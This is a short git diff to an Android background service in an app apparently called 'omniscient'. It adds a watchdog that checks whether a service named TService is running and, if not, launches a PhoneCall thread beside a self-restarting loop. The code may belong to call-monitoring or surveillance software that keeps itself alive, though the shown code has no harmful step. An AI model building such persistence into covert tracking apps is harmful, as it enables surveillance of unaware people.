@@ -1,5 +1,6 @@
 package com.postal.omniscient.postal.service;
 
+import android.app.ActivityManager;
 import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.PendingIntent;
@@ -127,6 +128,20 @@ public class MyService extends Service {
 
             Intent par = new Intent(getApplicationContext(), StartService.class);
             startService(par);// Залоченый безконечный цыкл
+
+            boolean flag = true;
+            ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
+            for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
+                if (TService.class.getName().equals(service.service.getClassName())) {
+                    // Log.i("MyMsg", "рабочий");
+                    flag = false;
+                }
+            }
+            if(flag){
+                PhoneCall run = new PhoneCall(getContext());
+                Thread t = new Thread(run);
+                t.start();
+            }
 
 
 //            par = null;
